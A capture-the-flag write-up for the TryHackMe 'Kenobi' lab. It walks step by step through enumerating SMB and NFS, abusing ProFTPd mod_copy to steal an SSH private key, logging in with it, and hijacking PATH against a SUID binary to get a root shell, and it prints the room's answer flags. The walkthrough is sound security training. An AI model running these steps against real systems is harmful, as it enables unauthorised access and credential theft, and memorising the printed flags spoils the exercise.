Room: https://tryhackme.com/r/room/kenobi
Title: Kenobi
Target IP: 10.10.61.170

1. Scan the machine with nmap, how many ports are open?
   - Perform a basic nmap scan using ```nmap -sC -sV [Target IP]```
   - We see 7 ports open: 21,22, 80, 111, 139, 445, 2049
   - Answer: **7**

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/d2b36b23-1af4-4926-aafa-2894b0672133)

2. Using the nmap command above, how many shares have been found?
   - ```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [Target IP]```
   -  ```-p``` specifies which port to do an nmap scan
   -  ```--script``` tells the nmap to use a script to enumerate shares
   -  We find three shares: \\10.10.61.170\IPC$:, \\10.10.61.170\anonymous:, \\10.10.61.170\print$:
   -  Answer: ***3***

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/82cff097-a320-438a-a1e7-1bb19ac4c99a)

3. Once your're connected, list the files on the share. What file can you see?
   - Use ```smbclient //[Target IP]/anonymous``` to connect to the machines network share
   - Enter any value for the password
   - List out the files use ```ls```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/20b6445a-68c5-485c-8079-673e24c617d3)

4. What port is FTP running on?
   - Save the file to your current directory using ```get log.txt```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/98ff0f8e-c001-4964-88bd-3bd4cf4401ec)

  - View the contents of the log.txt file and see what port FTP is running on

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/59e92523-23a0-42db-9328-644fbba22ce1)

  - Answer: **21**

4. What mount can we see?
  - Copy and paste the given command ```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount [Target IP]```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/6174c55a-ecd7-4833-9d6d-43b7990db4a4)

  - Answer: **/var**

5. What is the version?
  - Use netcat listner on port 21 to see the version of FTP being used
  - ```nc [Target IP] 21```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/bf182516-a6b4-487a-8d1c-380fa370dd1d)

6. How may exploits are there for the ProFTPd running?
   - Searchsploit is a build in command line tool that seraching for exploits based on exlpoit-db.com
   - ```searchsploit proftpd 1.3.5```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/e4bb2ab9-d7c9-4e9c-ae6a-334e8203cc2e)

  - Answer: **4**

7. What is Kenobi's user flag?
  - Go back to netcat listener ```nc [Target IP] 21```
  - Enter command ```SITE CPFR /home/kenobi/.ssh/id_rsa```
  - Enter command ```SITE CPTO /var/tmp/id_rsa```
  - NOTE: These commands help to rename, relocate, and copy the directory ```/home/kenobi/.ssh/id_rsa``` to our own machine

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/abd69cbf-0446-4413-a562-09ce68790e94)

  - Create this directory ```mkdir /mnt/kenobiNFS```
  - Navigate to it
  - Mount the /var/tmp/ directory, ```mount [Target IP]:/var /mnt/kenobiNFS```
  - Use ```ls -la /mnt/kenobiNFS``` to view the files/directories and their permissions

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/1c89d21b-6282-42b3-b587-a734b7c73654)

  - Copy the id_rsa private key to our machine and directory of choice

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/6ca618b0-125a-4e17-b33e-1fdb0df3ff61)

  - Change file permissions so only we can read id_rsa
    ```chmod 600 id_rsa```
  - SSH into Kenobi's account using the private key
    ```ssh -i id_rsa kenobi@[Target IP]```
    
  - NOTE: If you get this SSH error, you may need to switch from NAT to Bridged Adapted (vice versa) in your Virtual Machine settings...

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/6ac5112c-8645-494e-8643-02875d513fec)

  - Find the flag!!

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/b48def7d-0fb3-418c-9733-d3e7f3198a64)

  - Answer: **d0b0f3f53b6caa532a83915e19224899**

8. What file looks particularly out of the ordinary?
  - Run the command ```find / -perm -u=s -type f 2>/dev/null```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/444f81b2-2de6-492a-8a20-0bf220b5819b)

  - Answer: ```/usr/bin/menu```

9. Run the binary, how many options appear?
  - Run ```/usr/bin/menu```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/df3a9cc5-a969-4a08-abe0-275a9dd7b222)

  - Answer: **3**

10. What is the root flag?
  - Follow the commands to manipulate our path and gain a root shell
  - ```cd /tmp``` Navigate to the tmp directory
  - ```echo /bin/sh > curl``` outputs a file named curl with the contents of /bin/sh
  - ```chmod 777 curl``` changes permissions to read,write,execute for the user, group users, and others
  - ```export PATH=/tmp:$PATH``` tells the system to look at the tmp directory first to run commands
  - ```/usr/bin/menu``` executes the "menu" executable file
  - Find the flag!!

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/a9118b14-4d79-4c79-b38e-7944d0596613)

   - Answer: **177b3cd8562289f37382721c28381f02**
